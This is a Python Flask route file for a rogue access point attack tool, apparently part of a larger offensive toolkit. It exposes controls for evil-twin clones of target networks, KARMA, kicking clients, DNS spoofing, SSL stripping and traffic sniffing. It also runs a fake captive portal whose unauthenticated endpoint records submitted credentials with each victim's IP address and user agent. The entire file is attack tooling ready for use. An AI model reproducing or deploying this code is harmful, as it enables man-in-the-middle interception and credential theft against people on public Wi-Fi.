"""WiFi Pineapple / Rogue AP routes."""
from flask import Blueprint, request, jsonify, render_template, make_response
from web.auth import login_required

pineapple_bp = Blueprint('pineapple', __name__, url_prefix='/pineapple')


def _get_ap():
    from modules.pineapple import get_pineapple
    return get_pineapple()


@pineapple_bp.route('/')
@login_required
def index():
    return render_template('pineapple.html')


@pineapple_bp.route('/interfaces')
@login_required
def interfaces():
    return jsonify(_get_ap().get_interfaces())


@pineapple_bp.route('/tools')
@login_required
def tools_status():
    return jsonify(_get_ap().get_tools_status())


@pineapple_bp.route('/start', methods=['POST'])
@login_required
def start_ap():
    data = request.get_json(silent=True) or {}
    return jsonify(_get_ap().start_rogue_ap(
        ssid=data.get('ssid', ''),
        interface=data.get('interface', ''),
        channel=data.get('channel', 6),
        encryption=data.get('encryption', 'open'),
        password=data.get('password'),
        internet_interface=data.get('internet_interface')
    ))


@pineapple_bp.route('/stop', methods=['POST'])
@login_required
def stop_ap():
    return jsonify(_get_ap().stop_rogue_ap())


@pineapple_bp.route('/status', methods=['GET', 'POST'])
@login_required
def status():
    return jsonify(_get_ap().get_status())


@pineapple_bp.route('/evil-twin', methods=['POST'])
@login_required
def evil_twin():
    data = request.get_json(silent=True) or {}
    return jsonify(_get_ap().evil_twin(
        target_ssid=data.get('target_ssid', ''),
        target_bssid=data.get('target_bssid', ''),
        interface=data.get('interface', ''),
        internet_interface=data.get('internet_interface')
    ))


@pineapple_bp.route('/portal/start', methods=['POST'])
@login_required
def portal_start():
    data = request.get_json(silent=True) or {}
    return jsonify(_get_ap().start_captive_portal(
        portal_type=data.get('type', 'hotel_wifi'),
        custom_html=data.get('custom_html')
    ))


@pineapple_bp.route('/portal/stop', methods=['POST'])
@login_required
def portal_stop():
    return jsonify(_get_ap().stop_captive_portal())


@pineapple_bp.route('/portal/captures')
@login_required
def portal_captures():
    return jsonify(_get_ap().get_portal_captures())


@pineapple_bp.route('/portal/capture', methods=['POST'])
def portal_capture():
    """Receive credentials from captive portal form submission (no auth required)."""
    ap = _get_ap()
    # Accept both form-encoded and JSON
    if request.is_json:
        data = request.get_json(silent=True) or {}
    else:
        data = dict(request.form)
    data['ip'] = request.remote_addr
    data['user_agent'] = request.headers.get('User-Agent', '')
    ap.capture_portal_creds(data)
    # Return the success page
    html = ap.get_portal_success_html()
    return make_response(html, 200)


@pineapple_bp.route('/portal/page')
def portal_page():
    """Serve the captive portal HTML page (no auth required)."""
    ap = _get_ap()
    html = ap.get_portal_html()
    return make_response(html, 200)


@pineapple_bp.route('/karma/start', methods=['POST'])
@login_required
def karma_start():
    data = request.get_json(silent=True) or {}
    return jsonify(_get_ap().enable_karma(data.get('interface')))


@pineapple_bp.route('/karma/stop', methods=['POST'])
@login_required
def karma_stop():
    return jsonify(_get_ap().disable_karma())


@pineapple_bp.route('/clients')
@login_required
def clients():
    return jsonify(_get_ap().get_clients())


@pineapple_bp.route('/clients/<mac>/kick', methods=['POST'])
@login_required
def kick_client(mac):
    return jsonify(_get_ap().kick_client(mac))


@pineapple_bp.route('/dns-spoof', methods=['POST'])
@login_required
def dns_spoof_enable():
    data = request.get_json(silent=True) or {}
    spoofs = data.get('spoofs', {})
    return jsonify(_get_ap().enable_dns_spoof(spoofs))


@pineapple_bp.route('/dns-spoof', methods=['DELETE'])
@login_required
def dns_spoof_disable():
    return jsonify(_get_ap().disable_dns_spoof())


@pineapple_bp.route('/ssl-strip/start', methods=['POST'])
@login_required
def ssl_strip_start():
    return jsonify(_get_ap().enable_ssl_strip())


@pineapple_bp.route('/ssl-strip/stop', methods=['POST'])
@login_required
def ssl_strip_stop():
    return jsonify(_get_ap().disable_ssl_strip())


@pineapple_bp.route('/traffic')
@login_required
def traffic():
    return jsonify(_get_ap().get_traffic_stats())


@pineapple_bp.route('/sniff/start', methods=['POST'])
@login_required
def sniff_start():
    data = request.get_json(silent=True) or {}
    return jsonify(_get_ap().sniff_traffic(
        interface=data.get('interface'),
        filter_expr=data.get('filter'),
        duration=data.get('duration', 60)
    ))


@pineapple_bp.route('/sniff/stop', methods=['POST'])
@login_required
def sniff_stop():
    return jsonify(_get_ap().stop_sniff())
